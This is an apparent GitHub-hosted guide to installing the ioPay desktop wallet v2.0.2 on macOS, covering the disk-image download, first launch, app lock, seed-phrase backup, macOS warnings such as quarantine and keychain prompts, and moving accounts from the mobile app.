![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# ioPay Wallet on macOS: Install and First Launch

The current release is **v2.0.2, published 19 November 2026**. On macOS it arrives as a disk image:

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

**`iopay-wallet-desktop-macos-v2.0.2.dmg` - 21.5 MB**

It is a single `.dmg` for the platform. The release does not publish separate Intel and Apple Silicon builds, and it does not ship a `.pkg`.

## Before you start

- macOS on a current release (the app is 64-bit; older 32-bit-only systems are out).
- About **60 MB** free, including the mounted image.
- The release page open in a browser - the only documented download route.
- A decision about your phrase. If you have not made one, read [backing up your seed phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md) before you create a wallet, not after.

## Install

1. **Download the `.dmg`.** From the release assets, take `iopay-wallet-desktop-macos-v2.0.2.dmg`. Check the file name includes both `macos` and `v2.0.2` - the Windows and Linux assets sit directly above and below it in the list.
2. **Open the image.** Double-clicking mounts it in Finder.
3. **Drag the app to Applications.** That is the install. There is no installer wizard and no licence checkbox.
4. **Eject the image** once the copy finishes, so you are not running the app from a mounted volume.
5. **First launch.** macOS will warn that the app was downloaded from the internet. That prompt is normal for any app distributed outside the App Store: confirm, and if macOS refuses to open it, use the standard Open-anyway path from Finder's context menu. Do not disable Gatekeeper globally to work around it.
6. **Set the app lock.** The first run asks for a **PIN**, with biometric unlock where the machine supports it.
7. **Create or import.** New wallet, or import by phrase, private key or keystore. Moving machines? Use [the restore guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/restoring-iopay-wallet-from-a-seed-phrase.md).
8. **Check both addresses.** `io1...` and `0x...` should both appear for the account before you receive anything.

## First-run checklist

- The phrase is on paper, offline, and not in the same bag as the Mac.
- You have restored once from that phrase into a throwaway account to prove it works.
- The app reports **v2.0.2**.
- You know which address format the sender will use.

## The macOS-specific snags

**"App is damaged and can't be opened."** This is usually quarantine metadata on a partially downloaded file rather than actual damage. Delete the `.dmg`, download it again from the release page, and check the size against 21.5 MB. If the second copy behaves the same way, stop - do not run terminal commands that strip quarantine from an unknown file, and check [whether the download is genuine](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/spotting-fake-iopay-wallet-downloads.md).

**Apple Silicon vs Intel.** The release does not label the image for either architecture, so this guide does not claim native Apple Silicon support. If performance matters to you, run it and see; the wallet is not compute-heavy.

**Keychain prompts.** The app stores secrets in the OS keychain, so macOS may ask for your login password when the app unlocks or when you change the app lock. That prompt is the feature working, not an error.

**Updates.** The build supports auto-update. If you prefer to update by hand, replace the app in Applications with the newer `.dmg` - your accounts live in the app's data, not in the bundle, so replacing the app does not touch them. See [updating ioPay Wallet](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/updating-iopay-wallet-to-the-latest-version.md).

## What's next

Installing is the easy part; the backup is the part that decides whether you can ever recover. Do that now: [how to back up your ioPay seed phrase](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md).

Other platforms: [Windows](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/install-iopay-wallet-on-windows.md) - [Linux](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-desktop-install-on-linux.md).

## Moving from the mobile app

If the account already lives in ioPay on a phone, do not create a new wallet on the Mac - import the phrase you already have. The engine accepts a 12- or 24-word phrase, a private key or a keystore file (F018), so the same account arrives with its balances and staking positions intact. [Moving IOTX from ioPay mobile to desktop](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/moving-iotx-from-iopay-mobile-to-desktop-wallet.md) sets out the order of operations; the short version is that the import happens on the desktop first and the tokens never move, because they were never on the phone.

## Where the accounts live

Accounts live in the app's data directory, not inside the `.dmg` and not in the app bundle. That is why replacing the app in Applications with a newer build is safe: accounts, app lock and settings stay where they were. It is also why "delete the app and start again" is not a recovery method - if the data directory goes and the phrase was never written down, the account is gone.

Before a macOS upgrade, the preparation that matters is not a copy of the app; it is a restore test of the phrase somewhere else. A backup you have never restored is a hypothesis.


## The first week on a Mac

Two habits keep an install stable. Keep the `.dmg` out of Downloads once the app is in Applications, so a stray double-click cannot mount an old image beside the build you actually run, and check the version the app reports against the release page before you send anything. The second habit concerns the phrase: it belongs on paper, not in Notes, not in a password manager that syncs, and not in a photograph of a screen. If Desktop and Documents are synced to iCloud, a text file left there travels further than intended.

---

*The download is the v2.0.2 release asset from the ioPay Wallet repository. No claim is made here about notarisation or a named signing identity, neither of which the release publishes; the three assets' SHA-256 values are in the app README if you want to check the file itself.*
